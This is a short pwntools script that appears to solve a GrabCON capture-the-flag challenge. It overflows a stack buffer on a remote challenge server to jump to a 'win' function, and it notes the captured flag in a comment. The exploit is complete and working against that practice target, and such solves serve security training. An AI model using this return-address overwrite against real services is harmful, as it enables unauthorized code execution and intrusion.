from pwn import *

r = remote('35.205.161.145', 49153)

padding = b'A' * 48
win_addr = 0x00401147

payload = padding + b'B'*8 + p64(win_addr)

r.sendline(payload)
r.interactive()

#flag = GrabCON{w3ll_Y0u_Kn0w_Basics!!!}
